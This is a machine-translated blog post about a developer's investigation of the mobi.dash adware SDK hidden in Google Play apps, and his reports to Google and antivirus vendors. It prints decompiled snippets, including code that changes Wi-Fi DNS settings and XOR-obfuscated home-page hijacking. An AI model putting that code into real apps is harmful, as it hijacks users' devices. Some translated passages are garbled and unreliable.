<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>How I fought adware on google play and lost</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Over the past day, hundreds of news sites ( clack and tyts ) reprint one interesting news telling about the detection of the next malicious applicatio...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>How I fought adware on google play and lost</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/e0d/0d8/4d9/e0d0d84d98c4469ea0065e026dced543.jpg" align="left"><br>  Over the past day, hundreds of news sites ( <a href="http://www.bbc.com/news/technology-31129797">clack</a> and <a href="http://www.gazeta.ru/tech/2015/02/04_a_6399533.shtml">tyts</a> ) reprint one interesting news telling about the detection of the next malicious applications on Google Play.  This time adware showed annoying ads every time the device was unblocked and <s>billions of</s> phones and tablets were installed on <s>billions</s> .  Fortunately, the anti-virus company Avast detected the threat in time and the applications were removed. <br><br>  Under the cut, I will tell my version of events: how I calculated and searched for adware on Google Play, decompiled adware sdk code, can I wait for a response from Google support, why mobile antiviruses are useless and how they manage to make a good free adware on the hot information desk. <a name="habracut"></a><br><br><h4>  <b>"Your Android version is out of date"</b> </h4><br>  One evening my more humanitarian and wonderful half came to me in the question - why she cannot install the update on the phone, although the phone is constantly asking for it.  A browser tab was opened on the screen with a tempting suggestion to install this update.  When closing the tab, it turned out that more than 80 of these pages were open in the browser.  After a brief interrogation, it turned out that no suspicious applications were installed on the phone, in fact, in the settings, the ability to install from third-party sources was even disabled.  As it turned out, every time the phone was unlocked, a link with an advertisement or an AdMob banner banner on top of the launcher was opened in the browser. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/files/a5a/b27/ea0/a5ab27ea0c3c4ad89045764887568e1c.jpg"><img src="https://habrastorage.org/files/115/316/443/11531644398f45428536e38197bb193f.jpg"><br><br>  The story became interesting as the application came clearly from Google Play.  Taking the phone in one hand and LogCat in the other, I began to find out who launches this advertisement. <br><br><h5>  <b>// TODO: Disable logging in the release</b> </h5><br>  The hero of the occasion was installed very quickly - as it turned out, the developers did not care at all about disabling logging in the release version.  Each time when locking or unlocking the screen, LogCat received detailed information about the result of the request to the server for advertising and other debugging data.  It looked like this: <br><div class="spoiler">  <b class="spoiler_title">Logcat</b> <div class="spoiler_text">  01-31 02: 15: 13.303: D / Microlog (3020): Microlog 1669935: [DEBUG] -Open url external.  Start with intent: Intent {act = android.intent.action.VIEW dat = http: //brodero.com/v2/b/rs? Agid = af70e9985-a73c-46d6-a24e-a7e112748cf7 &amp; vid = 3ad864d4-643d-4f55-8dbd -ae76ebf08bbc &amp; bgid = ba6195268-bfaa-451c-8736-aba9b7449306 &amp; u = http: //terigal.ru/7utq44kvjob6n2rq47av5t9122twv5ob511x1pxpj4q&amp;dyn=xK9dZt_ZDOxeAvvtziYEB32B-KaPEp3_gYayyDZDVS0&amp;sig=eqrEar8HUBLiNU87e0xioQ&amp;ts=1421968510077&amp;m=0 flg = 0x10000000 cmp = com.android.chrome / com.google.android.apps .chrome.Main} <br>  01-31 02: 15: 13.306: I / ActivityManager (734): START u0 {act = android.intent.action.VIEW dat = http: //brodero.com/v2/b/rs? Agid = af70e9985-a73c- 46d6-a24e-a7e112748cf7 &amp; vid = 3ad864d4-643d-4f55-8dbd-ae76ebf08bbc &amp; bgid = ba6195268-bfaa-451c-8736-aba9b7449306 &amp; u = http: //terigal.ru/7utq44kvjob6n2rq47av5t9122twv5ob511x1pxpj4q&amp;dyn=xK9dZt_ZDOxeAvvtziYEB32B-KaPEp3_gYayyDZDVS0&amp;sig=eqrEar8HUBLiNU87e0xioQ&amp;ts=1421968510077&amp;m=0 flg = 0x10000000 cmp = com.android.chrome/com.google.android.apps.chrome.Main} from uid 10065 on display 0 <br></div></div><br>  Intent started the process with PID 3020. It only remained to find out which package owns this PID.  The team <i>‚Äúps |</i>  <i>grep 3020 "</i> , made in adb shell.  I received the answer unequivocal: <br><div class="spoiler">  <b class="spoiler_title">adb shell</b> <div class="spoiler_text">  shell @ hammerhead: / $ ps |  grep 3020 <br>  ps |  grep 3020 <br>  u0_a65 3020 195 1534568 66696 ffffffff 00000000 S com.sweet.world.history <br></div></div><br>  It turned out that behind this was the World History app.  The application has more than 5 thousand installations.  And it was installed from Google Play for a long time, but advertising began to crumble recently.  After removing the application, advertising certainly ceased to call the eyes. <br>  Well, it was not difficult, but you can not just leave it.  It's time to dissect the APK and get inside the code. <br><br><h5>  <b>"Scalpel, clamp ..."</b> </h5><br>  As for the tools, I will not tell you anything new - I used <a href="https://code.google.com/p/dex2jar/">dex2jar</a> to get the code in jar, <a href="https://code.google.com/p/android-apktool/">apktool</a> to decompile xml resources (and he also knows how to smali, but that's another story) and <a href="https://github.com/deathmarine/Luyten">Luyten</a> to decompile jar.  The latter, by the way, is highly recommended - Luyten is just a GUI for <a href="https://bitbucket.org/mstrobel/procyon">Procyon</a> , which in turn is very cool.  At least, compared to JD, which I used before, I liked Procyon more. <br><br>  Habrovchane familiar with the development under Android, have already realized that the application clearly registers a broadcast receiver to the events <i>android.intent.action.SCREEN_OFF</i> and <i>android.intent.action.SCREEN_ON</i> to display such tricky advertising.  You can subscribe to these actions only from the code, so there‚Äôs nothing interesting in the manifest.  But still, let's take a look and go there (not for nothing, it was decompiled, in the end) - there were some interesting components in the manifesto.  One of the broadcast receivers has been subscribed to <i>android.intent.action.BOOT_COMPLETED</i> .  It was called <i>mobi.dash.overapp.DisplayCheckRebootReceiver</i> - with it I started to study the code: <br><div class="spoiler">  <b class="spoiler_title">DisplayCheckRebootReceiver</b> <div class="spoiler_text"><pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onReceive</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">final</span></span></span></span><span class="hljs-function"><span class="hljs-params"> Context context, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">final</span></span></span></span><span class="hljs-function"><span class="hljs-params"> Intent intent)</span></span></span><span class="hljs-function"> </span></span>{ AdsLog.d(<span class="hljs-string"><span class="hljs-string">"AdsOverappRebootReceiver"</span></span>, intent.toString()); Object stringExtra = <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (intent != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) { stringExtra = intent.getStringExtra(DisplayCheckRebootReceiver.Param_Event); } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (DisplayCheckRebootReceiver.Event_SendAlive.equals(stringExtra)) { sendAlive(context); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } AdsOverappRunner.ping(context.getApplicationContext()); }</code> </pre> <br></div></div><br>  As you can see from the code, after the first reboot, the AdsOverappRunner.ping method will be <i>called</i> .  The specified method loads the settings from the <i>ads_settings.json</i> file, which is located in the resources in the raw folder, and starts the wait.  And how long this waiting will last is indicated in the file ads_settings.json.  Then everything is extremely simple - from this moment, through the <i>AlarmManager</i> with a frequency of 15 minutes, the application will pull all the same DisplayCheckRebootReceiver and check whether the incubation period has come out.  After the wait is over, <i>mobi.dash.overapp.DisplayCheckService</i> will be launched, which will already delight the user with advertising. <br><br>  In principle, so far nothing unusual, if it were not for one fact - all this was not the work of the author of the application, but was clearly a third-party SDK.  And even without any further analysis, it already inspired confidence, in the <i>mobi.dash</i> package <i>there</i> were about 200 classes. <br><br>  Each time the screen was locked, the SDK made a request to the server and received in the response an advertisement that should be shown.  At the same time, different types of advertising were supported: <br><div class="spoiler">  <b class="spoiler_title">DisplayCheckService</b> <div class="spoiler_text"><pre> <code class="java hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">showAd</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">final</span></span></span></span><span class="hljs-function"><span class="hljs-params"> AdsOverappType lastOverappType, </span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">final</span></span></span></span><span class="hljs-function"><span class="hljs-params"> BannerData bannerData)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hideAd(); BlacklistManager.getInatance().onBannerShow((Context)<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, bannerData.id); Ads.getHistory().addBannerAction(bannerData.localId, <span class="hljs-string"><span class="hljs-string">"service"</span></span>, <span class="hljs-string"><span class="hljs-string">"showAd"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.lastOverappType = lastOverappType; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.saveLastOverappType(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (lastOverappType == AdsOverappType.Alert) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.showAlert(bannerData); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (lastOverappType == AdsOverappType.Recommendation) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.showRecomendation(bannerData); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (lastOverappType == AdsOverappType.Link) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.showLink(bannerData); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (lastOverappType == AdsOverappType.Sdk) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.showSdk(bannerData); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.waitAndRequestNextAd(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (lastOverappType == AdsOverappType.Notification) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.showNotification(bannerData); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.waitAndRequestNextAd(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.showBanner(bannerData); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.waitAndRequestNextAd(); }</code> </pre><br></div></div><br>  On a command from the server, the SDK could show a dialog with the specified texts, open links in a browser, show ads for AdMob, Mopub or Chartboost, throw notifications. <br><br>  In addition, inside there was a more interesting functionality - the SDK was able to change the dns server in the wi-fi connection settings: <br><div class="spoiler">  <b class="spoiler_title">DisplayCheckService</b> <div class="spoiler_text"><pre> <code class="java hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">setupDns</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">final</span></span></span></span><span class="hljs-function"><span class="hljs-params"> Context context)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String dns = getDns(context); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!TextUtils.isEmpty((CharSequence)dns)) { <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> WifiManager wifiManager = (WifiManager)context.getSystemService(<span class="hljs-string"><span class="hljs-string">"wifi"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (wifiManager != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> DhcpInfo dhcpInfo = wifiManager.getDhcpInfo(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (dhcpInfo != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String formatIpAddress = Formatter.formatIpAddress(dhcpInfo.ipAddress); <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String formatIpAddress2 = Formatter.formatIpAddress(dhcpInfo.netmask); <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> String formatIpAddress3 = Formatter.formatIpAddress(dhcpInfo.gateway); <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> ContentResolver contentResolver = context.getContentResolver(); Settings$System.putString(contentResolver, <span class="hljs-string"><span class="hljs-string">"wifi_use_static_ip"</span></span>, <span class="hljs-string"><span class="hljs-string">"1"</span></span>); Settings$System.putString(contentResolver, <span class="hljs-string"><span class="hljs-string">"wifi_static_ip"</span></span>, formatIpAddress); Settings$System.putString(contentResolver, <span class="hljs-string"><span class="hljs-string">"wifi_static_netmask"</span></span>, formatIpAddress2); Settings$System.putString(contentResolver, <span class="hljs-string"><span class="hljs-string">"wifi_static_gateway"</span></span>, formatIpAddress3); Settings$System.putString(contentResolver, <span class="hljs-string"><span class="hljs-string">"wifi_static_dns1"</span></span>, dns); Settings$System.putString(contentResolver, <span class="hljs-string"><span class="hljs-string">"wifi_static_dns2"</span></span>, dns); } } } }</code> </pre><br></div></div><br>  Most likely, this was done in order to redirect users to the necessary advertising sites. <br>  Also, the SDK could create fake desktop shortcuts that led the user through the links that came from the server.  Well, perhaps the last interesting functionality - the ability to change the home page in the browser.  The code responsible for this turned out to be the only protected place in the SDK - everything else, how can be replaced, was not even obfuscated.  Browsers are different, so the SDK uses three different methods.  At the same time, the names of the intents or the URIs of the paths in the content resolver, which were used to change the home page, were encrypted with a crypto-resistant XOR encryption algorithm and initially looked like an array of bytes: <br><div class="spoiler">  <b class="spoiler_title">HomepageInjector</b> <div class="spoiler_text"><pre> <code class="java hljs">a = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] { <span class="hljs-number"><span class="hljs-number">13</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">37</span></span>, <span class="hljs-number"><span class="hljs-number">14</span></span>, <span class="hljs-number"><span class="hljs-number">25</span></span>, <span class="hljs-number"><span class="hljs-number">55</span></span>, <span class="hljs-number"><span class="hljs-number">75</span></span>, <span class="hljs-number"><span class="hljs-number">27</span></span>, <span class="hljs-number"><span class="hljs-number">24</span></span>, <span class="hljs-number"><span class="hljs-number">29</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">90</span></span>, <span class="hljs-number"><span class="hljs-number">94</span></span>, <span class="hljs-number"><span class="hljs-number">16</span></span>, <span class="hljs-number"><span class="hljs-number">29</span></span>, <span class="hljs-number"><span class="hljs-number">25</span></span>, <span class="hljs-number"><span class="hljs-number">89</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">93</span></span>, <span class="hljs-number"><span class="hljs-number">58</span></span>, <span class="hljs-number"><span class="hljs-number">54</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>, <span class="hljs-number"><span class="hljs-number">58</span></span>, <span class="hljs-number"><span class="hljs-number">58</span></span>, <span class="hljs-number"><span class="hljs-number">97</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">11</span></span>, <span class="hljs-number"><span class="hljs-number">3</span></span>, <span class="hljs-number"><span class="hljs-number">21</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">45</span></span>, <span class="hljs-number"><span class="hljs-number">49</span></span>, <span class="hljs-number"><span class="hljs-number">38</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>, <span class="hljs-number"><span class="hljs-number">32</span></span>, <span class="hljs-number"><span class="hljs-number">62</span></span>, <span class="hljs-number"><span class="hljs-number">55</span></span>, <span class="hljs-number"><span class="hljs-number">107</span></span>, <span class="hljs-number"><span class="hljs-number">59</span></span> }; b = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] { <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>, <span class="hljs-number"><span class="hljs-number">9</span></span>, <span class="hljs-number"><span class="hljs-number">23</span></span>, <span class="hljs-number"><span class="hljs-number">26</span></span>, <span class="hljs-number"><span class="hljs-number">27</span></span>, <span class="hljs-number"><span class="hljs-number">13</span></span> };</code> </pre><br></div></div><br>  After a simple operation, it turned into plain text: <br><div class="spoiler">  <b class="spoiler_title">XOR</b> <div class="spoiler_text">  lgeWapService.prov.persister.INSTALL_BROWSER <br>  homeuri <br></div></div><br>  And then rushed to the broadcast with such an action and extra-parameter.  It's likely that on LG phones this really changes the home page.  Most likely this is done to protect against antivirus scanning.  At least <a href="https://www.virustotal.com/ru/file/5fd42f03c600d23479bf1984aeb1830db99973d6dc72ae2e0db803c0eea60fab/analysis/">virustotal</a> confidently stated that the application is absolutely safe. <br><br><h5>  <b>Their name is legion</b> </h5><br>  Since the SDK looked very good, it was unlikely that it was written only to integrate it into an application with 5 thousand installations.  First of all, I checked the rest of the applications of the same author.  As it turned out, in each of them was built advertising mobi.dash.  And the author had a lot of applications: <br><br><img src="https://habrastorage.org/files/072/18e/e6b/07218ee6b431489c8de66500f45be3eb.jpg"><br><br>  Of course, basically they had very few installations, but one of them had over 50 thousand installations.  But of course, this publisher should not be limited to a single publisher.  Since the SDK went for advertising on the <i>ad1.mads.bz</i> server <i>,</i> I decided to look for someone else who had this problem.  It turned out that on w3bsit3-dns.com there is a whole <a href="http://4pda.ru/forum/index.php%3Fshowtopic%3D595445%26st%3D0">topic</a> , where users are fighting with such an advertisement.  There I found references to two more applications that pulled ads from <i>ad1.mads.bz.</i>  These applications have turned out to be much more popular: <br><br><img src="https://habrastorage.org/files/318/cb1/2ed/318cb12ed44d4c6699f0b5f6634d4de8.jpg"><img src="https://habrastorage.org/files/c62/3bf/dc6/c623bfdc65264a4b97a1546d3f821b0a.png"><br><br>  More than 5 million and more than 1 million installations - a good audience reach.  The card game "Fool" with such a number of installations should have tens of thousands of active users daily.  The reviews had a lot of negative comments about the fact that the game shows ads, but antiviruses do not determine anything.  This was rather strange, given the antiviruses swear even on the AirPush SDK, the ads that are clearly less annoying.  By the way, the <a href="http://andrototal.org/sample-analysis/27168">first</a> mention that I found was mobi.dash sdk is dated <i>October 1, 2013</i> .  Probably after a year and a half and hundreds of user complaints, should someone take action?  What else can a regular user do <s>(hardresset, of course)</s> if such an advertisement has settled in him, if not to look for help from mobile antiviruses.  I checked three mobile antiviruses: Avast Mobile Security, Dr.  Web and Kaspersky Internet Security.  The opinion was unanimous: <br><br><img src="https://habrastorage.org/files/b6e/94a/462/b6e94a46227745f38ac0c8c2730ac104.jpg"><img src="https://habrastorage.org/files/05b/da4/1c8/05bda41c820141ccaff4f8607f8c47bd.jpg"><img src="https://habrastorage.org/files/310/df4/054/310df405430c4524b74e49b244d263a1.jpg"><br><br>  Someone thought my phone was all right.  Perhaps it was necessary to do something with it. <br><br><h4>  <b>"Enough tolerating this!"</b> </h4><br>  By this time, I already had extensive information about the capabilities of the SDK, and what applications it carries in itself.  So the first thing I decided to <s>do was</s> report it on Google.  Under each application on Google Play there is a link ‚ÄúFlag as inappropriate‚Äù (it was there, by the way, not always and appeared only in the summer of 2014), by clicking on which everyone can report a violation.  Google takes these complaints so seriously that it even draws <a href="https://www.youtube.com/watch%3Fv%3Dpg_sxSql1dk">cartoons</a> about how serious it is about it.  Having passed not the easiest way from the Flag as inappropriate link to the field for entering the text of my complaint, I briefly stated the whole point.  A minute later, a reply came to me from the bot who asked me to describe in more detail what kind of rules the application violated and attach additional materials (screenshots, etc.) that would help them.  In response, I issued a long and detailed letter in which I explained that 4 rules from the Google Play Content Policy had been violated: <br><div class="spoiler">  <b class="spoiler_title">Google Play Content Policy violation</b> <div class="spoiler_text">  This app violate the following policies: <br><br>  * Google Play Content Policy, chapter 'System Interference': <br>  - This includes behavior such as apps, widgets, or settings on the device.  It is clear that it‚Äôs clear that it‚Äôs altogether. <br>  App can change DNS server when it is connected <br><br>  If you‚Äôre not happy, you‚Äôll not be able to use it. <br>  + App can change browser homecuts and create homescreen shortcuts <br><br>  It‚Äôs not a problem that you‚Äôll be able to make it. of in-game promotions). <br>  + App shows ad level <br><br>  * Google Play Ad Policy, chapter 'Ads Context': <br>  Notifications or notification of the operating system.  It should be clear. <br>  + Shown ads simulate operating system warning very often, screenshots are attached <br></div></div><br>  For complete understanding, I even recorded a video to show how this ad looks like: <br><iframe width="420" height="315" src="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u=https://www.youtube.com/embed/UkRAu2xcuTU%3Ffeature%3Doembed&amp;xid=17259,15700023,15700186,15700191,15700253&amp;usg=ALkJrhiKJdS1W_YXL35qpngc30nXjiEQxg" frameborder="0" allowfullscreen=""></iframe><br>  I described in detail my research on the advertising SDK and its capabilities, as well as provided a list of applications.  I wrote detailed instructions on how to quickly achieve advertising by simply translating the date.  The letter left me on January 22. <br>  I think that no one will be surprised that I have not received any answer to him and have not achieved any result from Google.  Unfortunately, in Google, Mr. Box deals with handling complaints from users and they are deposited in the far box. <br><br><h4>  <b>Antivirus</b> </h4><br>  Nevertheless, even if the applications remain in Google (and there are <a href="">140 of</a> them, by the way), it would be nice if the antiviruses somehow warned the SDK about this.  I created threads on the Avast, Dr.  Web and Kaspersky, in which he pointed out that antiviruses do not react to such advertising in any way and it would be nice to add it to the databases.  While it is extremely simple to do this - because in the manifest of such applications, the components <i>mobi.dash are declared</i> .  On the forum, Kaspersky responded very quickly, promised to sort it out and even donated a one-year subscription.  Moderator on the forum Dr.  Web suggested that I send the file for analysis to an antivirus lab.  Avast responded 3 days later and promised to sort it out.  I no longer had any activity on the forum topics. <br><br><div class="spoiler">  <b class="spoiler_title">UPDATE</b> <div class="spoiler_text">  Kaspersky ahead of the rest, the promise kept and sorted out.  At the date of publication of the article, Kaspersky Internet Security has already found this ad module.  Finds now: <br><img src="https://habrastorage.org/files/c70/ab2/d7e/c70ab2d7ef4b4eaba9dfd9e7f3425e2d.png"><br></div></div><br>  Today, 10 days after my forum posts, suddenly, comments began to appear under the video with a demonstration of advertising.  This was somewhat strange, considering that the video was private.  Even more strange was the fact that the video had 10 thousand views (and at the moment it has already exceeded 20 thousand).  It turned out that Avast posted <a href="https://blog.avast.com/2015/02/03/apps-on-google-play-pose-as-games-and-infect-millions-of-users-with-adware/">an</a> application <a href="https://blog.avast.com/2015/02/03/apps-on-google-play-pose-as-games-and-infect-millions-of-users-with-adware/">article</a> on the blog with this ad SDK.  There was nothing new, except for what I wrote, in this article, unless an advertisement was added for the premium version of Avast antivirus, which already defines this advertisement.  Apparently, the story turned out to be interesting and press releases hit the mark.  Somehow it happened that after I posted links to applications and SDK analysis on the forum, the news about how Avast and analyst Filip Chytry discovered malicious applications on Google Play hit many large information resources.  <s>And here the company Avast and analyst Philip Kitry, it would seem.</s> <br><br>  Six hours after posting to the blog, all the applications I mentioned were removed from Google Play: <br><blockquote>  Google spokeswoman speaks about three hours after this post went live. </blockquote><br><br><h4>  <b>Happy end</b> </h4><br>  Let my fight against adware specifically end in nothing - my complaint was ignored by Google and Avast turned out to be the saviors, but still the result was achieved.  True, I have a very mediocre attitude to this result - it turned out to be impossible to reach Google, and antivirus vendors are not very interested in improving mobile products, if they did not pay attention to such a problem in 1.5 years.  Nevertheless, I want to believe that for many users the results of this story will make life a little easier in the future. </div><p>Source: <a href="https://habr.com/ru/post/249765/">https://habr.com/ru/post/249765/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../249753/index.html">An overview of the Strela robotic platform or a do-it-yourself simple bluetooth bot</a></li>
<li><a href="../249755/index.html">Cards, Troika, payments</a></li>
<li><a href="../249757/index.html">How to hack Yandex two-factor authentication</a></li>
<li><a href="../249759/index.html">Sample Feature Engineering in Machine Learning</a></li>
<li><a href="../249761/index.html">Sberbank Online: find out personal data by phone</a></li>
<li><a href="../249767/index.html">Authoring Perl Modules</a></li>
<li><a href="../249769/index.html">The ‚ÄúUnread issues‚Äù plugin - as we notify employees in Redmine. General concept</a></li>
<li><a href="../249771/index.html">How and why we do TLS in Yandex</a></li>
<li><a href="../249773/index.html">DevCon 2015: announcement of the first speakers and conference reports</a></li>
<li><a href="../249775/index.html">Zombies are attacking the App Store, Android is catching up with iOS, Liam Neeson is taking revenge on the offender - and other news of the week for a mobile developer</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>